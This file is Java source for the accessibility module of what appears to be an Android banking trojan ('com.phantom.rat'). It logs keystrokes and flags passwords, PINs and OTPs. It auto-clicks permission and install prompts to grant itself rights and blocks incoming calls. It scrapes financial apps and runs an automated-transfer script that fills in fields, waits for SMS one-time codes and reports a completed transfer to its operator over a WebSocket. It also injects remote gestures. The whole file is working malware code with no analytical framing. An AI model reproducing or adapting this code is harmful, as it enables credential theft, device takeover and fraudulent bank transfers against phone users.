package com.phantom.rat;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.graphics.Path;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayDeque;
import java.util.List;

public class AccessibilityModule extends AccessibilityService {
    private static volatile boolean keylogEnabled = false;
    private static volatile boolean autoGrant = false;
    private static volatile boolean blockCalls = false;
    private static volatile String pendingScrapeApp = null;
    private static volatile AtsEngine.Script atsScript = null;

    private static final StringBuilder KEYLOG = new StringBuilder();
    private static final StringBuilder WINLOG = new StringBuilder();
    private static final int CAP = 100000;

    public static void setKeylog(boolean on) { keylogEnabled = on; }
    public static boolean isKeylogEnabled() { return keylogEnabled; }
    public static void autoGrant(boolean on) { autoGrant = on; }
    public static void blockCalls(boolean on) { blockCalls = on; }
    public static void setScrapeTarget(String app) { pendingScrapeApp = app; }
    public static void setAtsScript(AtsEngine.Script s) { atsScript = s; }

    public static synchronized String dumpKeys() {
        String s = KEYLOG.toString();
        return s.isEmpty() ? "empty" : s.substring(Math.max(0, s.length() - 8000));
    }

    public static synchronized String dumpWindows() {
        String s = WINLOG.toString();
        return s.isEmpty() ? "empty" : s.substring(Math.max(0, s.length() - 4000));
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        win("accessibility service connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        String pkg = event.getPackageName() == null ? "" : event.getPackageName().toString();
        try {
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: {
                    win(pkg + " :: " + event.getClassName());
                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root == null) return;
                    handleWindow(pkg, root);
                    runAts(root, pkg);
                    if (pendingScrapeApp != null && matches(pkg, pendingScrapeApp))
                        FinScraper.scan(root, pkg, pendingScrapeApp);
                    break;
                }
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                    if (!keylogEnabled) break;
                    List<CharSequence> t = event.getText();
                    if (t == null || t.isEmpty()) break;
                    StringBuilder sb = new StringBuilder();
                    for (CharSequence c : t) sb.append(c);
                    String text = sb.toString();
                    if (text.trim().isEmpty()) break;
                    key(pkg + " " + (isCred(text) ? "[CRED] " : "") + text);
                    break;
                }
                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED: {
                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root == null) break;
                    if (pendingScrapeApp != null && matches(pkg, pendingScrapeApp))
                        FinScraper.scan(root, pkg, pendingScrapeApp);
                    runAts(root, pkg);
                    break;
                }
            }
        } catch (Exception ignored) {}
    }

    private void handleWindow(String pkg, AccessibilityNodeInfo root) {
        if (autoGrant && (pkg.contains("permissioncontroller") || pkg.contains("packageinstaller"))) {
            clickByText(root, "Allow all the time");
            clickByText(root, "While using the app");
            clickByText(root, "Allow");
            clickByText(root, "Install");
            clickByText(root, "Next");
            clickByText(root, "OK");
            clickByText(root, "Update");
        }
        if (pkg.startsWith("com.android.settings")) {
            String label = appLabel();
            if (label != null && clickByText(root, label)) {
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    AccessibilityNodeInfo r = getRootInActiveWindow();
                    if (r != null) {
                        clickByText(r, "Allow display over other apps");
                        clickByText(r, "Don't optimize");
                        clickByText(r, "Allow");
                    }
                }, 1200);
            }
        }
        if (blockCalls && (pkg.contains("incallui") || pkg.contains("telecom") || pkg.contains("dialer"))) {
            clickByText(root, "Decline");
            clickByText(root, "Dismiss");
            clickByText(root, "End");
        }
    }

    private void runAts(AccessibilityNodeInfo root, String pkg) {
        AtsEngine.Script s = atsScript;
        if (s == null || root == null) return;
        AtsEngine.Op op = s.current();
        if (op == null) { atsScript = null; return; }
        try {
            switch (op.type) {
                case "TAP_TEXT":
                    if (clickByText(root, op.value)) s.next();
                    break;
                case "SET_HINT_TEXT":
                    if (setTextByHint(root, op.value, op.text)) s.next();
                    break;
                case "WAIT_PACKAGE":
                    if (pkg.equals(op.value)) s.next();
                    break;
                case "WAIT_OTP":
                    if (!SmsMonitor.latestOtp(this).isEmpty()) s.next();
                    break;
                case "WAIT_MS":
                    s.next();
                    break;
                case "DONE": {
                    atsScript = null;
                    WebSocketClient w = WebSocketClient.getInstance();
                    if (w != null) w.sendLog("ats", "transfer flow completed");
                    break;
                }
            }
        } catch (Exception ignored) {}
    }

    private boolean matches(String pkg, String target) {
        return target == null || target.isEmpty() || target.equals("all")
                || pkg.toLowerCase().contains(target.toLowerCase());
    }

    private static boolean isCred(String t) {
        String s = t.toLowerCase();
        return s.contains("password") || s.contains("passcode") || s.contains("pin")
                || s.contains("@") || s.contains("card") || s.contains("code")
                || s.contains("user") || s.contains("login") || s.contains("otp");
    }

    private static synchronized void key(String line) {
        KEYLOG.append(System.currentTimeMillis()).append(" ").append(line).append('\n');
        if (KEYLOG.length() > CAP) KEYLOG.delete(0, KEYLOG.length() - CAP);
    }

    private static synchronized void win(String line) {
        WINLOG.append(System.currentTimeMillis()).append(" ").append(line).append('\n');
        if (WINLOG.length() > CAP) WINLOG.delete(0, WINLOG.length() - CAP);
    }

    private String appLabel() {
        try {
            CharSequence l = getPackageManager().getApplicationLabel(
                    getPackageManager().getApplicationInfo(getPackageName(), 0));
            return l == null ? null : l.toString();
        } catch (Exception e) {
            return null;
        }
    }

    private boolean clickByText(AccessibilityNodeInfo root, String text) {
        if (root == null || text == null) return false;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        for (AccessibilityNodeInfo n : nodes) {
            if (n.isClickable()) { n.performAction(AccessibilityNodeInfo.ACTION_CLICK); return true; }
        }
        for (AccessibilityNodeInfo n : nodes) {
            AccessibilityNodeInfo p = n.getParent();
            if (p != null && p.isClickable()) { p.performAction(AccessibilityNodeInfo.ACTION_CLICK); return true; }
            if (n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true;
        }
        return false;
    }

    private boolean setTextByHint(AccessibilityNodeInfo root, String hints, String text) {
        if (root == null) return false;
        String[] parts = hints.toLowerCase().split("\\|");
        ArrayDeque<AccessibilityNodeInfo> q = new ArrayDeque<>();
        q.add(root);
        while (!q.isEmpty()) {
            AccessibilityNodeInfo n = q.poll();
            if (n == null) continue;
            CharSequence hint = n.getHintText();   // API 26+, minSdk 26 OK
            String vid = n.getViewIdResourceName();
            if (hint != null || vid != null) {
                String h = hint == null ? "" : hint.toString().toLowerCase();
                String v = vid == null ? "" : vid.toLowerCase();
                for (String p : parts) {
                    if (h.contains(p) || v.contains(p)) {
                        Bundle b = new Bundle();
                        b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                        n.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
                        if (n.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b)) return true;
                    }
                }
            }
            for (int i = 0; i < n.getChildCount(); i++) q.add(n.getChild(i));
        }
        return false;
    }

    /** HVNC gesture injection (API 24+, minSdk 26) */
    public void tap(float x, float y) {
        Path p = new Path();
        p.moveTo(x, y);
        GestureDescription.Builder b = new GestureDescription.Builder();
        b.addStroke(new GestureDescription.StrokeDescription(p, 0, 80));
        dispatchGesture(b.build(), null, null);
    }

    public void swipe(float x1, float y1, float x2, float y2, long dur) {
        Path p = new Path();
        p.moveTo(x1, y1);
        p.lineTo(x2, y2);
        GestureDescription.Builder b = new GestureDescription.Builder();
        b.addStroke(new GestureDescription.StrokeDescription(p, 0, dur));
        dispatchGesture(b.build(), null, null);
    }

    @Override
    public void onInterrupt() {}
}
